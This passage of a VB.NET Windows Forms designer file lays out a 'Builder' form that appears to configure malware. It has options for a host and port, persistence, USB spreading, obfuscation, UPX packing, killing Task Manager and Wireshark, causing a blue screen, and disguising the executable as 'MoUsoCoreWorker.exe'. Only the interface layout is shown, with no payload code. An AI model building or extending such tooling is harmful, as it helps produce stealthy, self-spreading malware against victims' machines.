        'Label11
        '
        Me.Label11.AutoSize = True
        Me.Label11.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label11.ForeColor = System.Drawing.Color.White
        Me.Label11.Location = New System.Drawing.Point(686, 240)
        Me.Label11.Name = "Label11"
        Me.Label11.Size = New System.Drawing.Size(60, 14)
        Me.Label11.TabIndex = 30
        Me.Label11.Text = "Exe Name"
        '
        'TextBox3
        '
        Me.TextBox3.BackColor = System.Drawing.Color.Black
        Me.TextBox3.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextBox3.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.TextBox3.ForeColor = System.Drawing.Color.White
        Me.TextBox3.Location = New System.Drawing.Point(752, 238)
        Me.TextBox3.Name = "TextBox3"
        Me.TextBox3.Size = New System.Drawing.Size(204, 20)
        Me.TextBox3.TabIndex = 31
        Me.TextBox3.Text = "MoUsoCoreWorker.exe"
        '
        'GroupBox4
        '
        Me.GroupBox4.BackColor = System.Drawing.Color.Black
        Me.GroupBox4.Controls.Add(Me.TextBox1)
        Me.GroupBox4.Controls.Add(Me.Label9)
        Me.GroupBox4.Controls.Add(Me.CheckBox2)
        Me.GroupBox4.Controls.Add(Me.CheckBox3)
        Me.GroupBox4.Controls.Add(Me.PictureBox1)
        Me.GroupBox4.Controls.Add(Me.CheckBox1)
        Me.GroupBox4.Controls.Add(Me.CKUpx)
        Me.GroupBox4.Controls.Add(Me.BOT_KILL)
        Me.GroupBox4.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.GroupBox4.ForeColor = System.Drawing.Color.White
        Me.GroupBox4.Location = New System.Drawing.Point(4, 238)
        Me.GroupBox4.Name = "GroupBox4"
        Me.GroupBox4.Size = New System.Drawing.Size(253, 160)
        Me.GroupBox4.TabIndex = 28
        Me.GroupBox4.TabStop = False
        Me.GroupBox4.Text = "Options 2"
        '
        'TextBox1
        '
        Me.TextBox1.BackColor = System.Drawing.Color.Black
        Me.TextBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextBox1.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.TextBox1.ForeColor = System.Drawing.Color.White
        Me.TextBox1.Location = New System.Drawing.Point(94, 135)
        Me.TextBox1.Name = "TextBox1"
        Me.TextBox1.Size = New System.Drawing.Size(149, 20)
        Me.TextBox1.TabIndex = 15
        Me.TextBox1.Text = "Wireshark.exe"
        '
        'Label9
        '
        Me.Label9.AutoSize = True
        Me.Label9.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label9.ForeColor = System.Drawing.Color.White
        Me.Label9.Location = New System.Drawing.Point(2, 137)
        Me.Label9.Name = "Label9"
        Me.Label9.Size = New System.Drawing.Size(86, 14)
        Me.Label9.TabIndex = 15
        Me.Label9.Text = "Process to kill"
        '
        'CheckBox2
        '
        Me.CheckBox2.AutoSize = True
        Me.CheckBox2.Cursor = System.Windows.Forms.Cursors.Hand
        Me.CheckBox2.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.CheckBox2.Location = New System.Drawing.Point(6, 92)
        Me.CheckBox2.Name = "CheckBox2"
        Me.CheckBox2.Size = New System.Drawing.Size(94, 18)
        Me.CheckBox2.TabIndex = 26
        Me.CheckBox2.Text = "Kill Taskmgr"
        Me.CheckBox2.UseVisualStyleBackColor = True
        '
        'CheckBox3
        '
        Me.CheckBox3.AutoSize = True
        Me.CheckBox3.Cursor = System.Windows.Forms.Cursors.Hand
        Me.CheckBox3.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.CheckBox3.Location = New System.Drawing.Point(6, 116)
        Me.CheckBox3.Name = "CheckBox3"
        Me.CheckBox3.Size = New System.Drawing.Size(91, 18)
        Me.CheckBox3.TabIndex = 28
        Me.CheckBox3.Text = "Kill Process"
        Me.CheckBox3.UseVisualStyleBackColor = True
        '
        'PictureBox1
        '
        Me.PictureBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.PictureBox1.Location = New System.Drawing.Point(199, 14)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(48, 48)
        Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PictureBox1.TabIndex = 25
        Me.PictureBox1.TabStop = False
        '
        'CheckBox1
        '
        Me.CheckBox1.AutoSize = True
        Me.CheckBox1.Cursor = System.Windows.Forms.Cursors.Hand
        Me.CheckBox1.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.CheckBox1.Location = New System.Drawing.Point(6, 20)
        Me.CheckBox1.Name = "CheckBox1"
        Me.CheckBox1.Size = New System.Drawing.Size(94, 18)
        Me.CheckBox1.TabIndex = 24
        Me.CheckBox1.Text = "Change Icon"
        Me.CheckBox1.UseVisualStyleBackColor = True
        '
        'Label12
        '
        Me.Label12.AutoSize = True
        Me.Label12.ForeColor = System.Drawing.Color.Lime
        Me.Label12.Location = New System.Drawing.Point(578, 25)
        Me.Label12.Name = "Label12"
        Me.Label12.Size = New System.Drawing.Size(48, 13)
        Me.Label12.TabIndex = 29
        Me.Label12.Text = "Disabled"
        '
        'Builder
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.Color.Black
        Me.ClientSize = New System.Drawing.Size(554, 405)
        Me.Controls.Add(Me.Label12)
        Me.Controls.Add(Me.GroupBox4)
        Me.Controls.Add(Me.GroupBox3)
        Me.Controls.Add(Me.Y)
        Me.Controls.Add(Me.Label8)
        Me.Controls.Add(Me.Label11)
        Me.Controls.Add(Me.GroupBox2)
        Me.Controls.Add(Me.T1)
        Me.Controls.Add(Me.Button1)
        Me.Controls.Add(Me.TextBox3)
        Me.Controls.Add(Me.GroupBox1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "Builder"
        Me.ShowIcon = False
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Builder"
        CType(Me.klen, System.ComponentModel.ISupportInitialize).EndInit()
        Me.GroupBox1.ResumeLayout(False)
        Me.GroupBox1.PerformLayout()
        CType(Me.SLP, System.ComponentModel.ISupportInitialize).EndInit()
        Me.GroupBox2.ResumeLayout(False)
        Me.GroupBox2.PerformLayout()
        CType(Me.port, System.ComponentModel.ISupportInitialize).EndInit()
        Me.GroupBox3.ResumeLayout(False)
        Me.GroupBox3.PerformLayout()
        CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).EndInit()
        Me.GroupBox4.ResumeLayout(False)
        Me.GroupBox4.PerformLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents Button1 As System.Windows.Forms.Button
    Friend WithEvents bsod As System.Windows.Forms.CheckBox
    Friend WithEvents T1 As System.Windows.Forms.TextBox
    Friend WithEvents Isf As System.Windows.Forms.CheckBox
    Friend WithEvents Isu As System.Windows.Forms.CheckBox
    Friend WithEvents klen As System.Windows.Forms.NumericUpDown
    Friend WithEvents Label6 As System.Windows.Forms.Label
    Friend WithEvents Anti_CH As CheckBox
    Friend WithEvents Label3 As Label
    Friend WithEvents exe As TextBox
    Friend WithEvents Label4 As Label
    Friend WithEvents dir As ComboBox
    Friend WithEvents Idr As CheckBox
    Friend WithEvents GroupBox1 As GroupBox
    Friend WithEvents USB_SP As CheckBox
    Friend WithEvents CKOBF As CheckBox
    Friend WithEvents CKUpx As CheckBox
    Friend WithEvents BOT_KILL As CheckBox
    Friend WithEvents Label7 As Label
    Friend WithEvents SLP As NumericUpDown
    Friend WithEvents GroupBox2 As GroupBox
    Friend WithEvents VN As TextBox
    Friend WithEvents Label5 As Label
    Friend WithEvents port As NumericUpDown
    Friend WithEvents Label2 As Label
    Friend WithEvents Label1 As Label
    Friend WithEvents host As TextBox
    Friend WithEvents HIDE_ME As CheckBox
    Friend WithEvents Y As TextBox
    Friend WithEvents Label8 As Label
    Friend WithEvents Persis As CheckBox
    Friend WithEvents GroupBox3 As GroupBox
    Friend WithEvents GroupBox4 As GroupBox
    Friend WithEvents CheckBox2 As CheckBox
    Friend WithEvents PictureBox1 As PictureBox
    Friend WithEvents CheckBox1 As CheckBox
    Friend WithEvents TextBox1 As TextBox
    Friend WithEvents Label9 As Label
    Friend WithEvents CheckBox3 As CheckBox
    Friend WithEvents CheckBox4 As CheckBox
    Friend WithEvents Label10 As Label
    Friend WithEvents TextBox2 As TextBox
    Friend WithEvents CheckBox5 As CheckBox
    Friend WithEvents Label11 As Label
    Friend WithEvents TextBox3 As TextBox
    Friend WithEvents PB As TextBox
    Friend WithEvents PasteE As CheckBox
    Friend WithEvents Label12 As Label
    Friend WithEvents CheckBox6 As CheckBox
    Friend WithEvents PictureBox2 As PictureBox
    Friend WithEvents Label13 As Label
    Friend WithEvents ComboBox1 As ComboBox
End Class
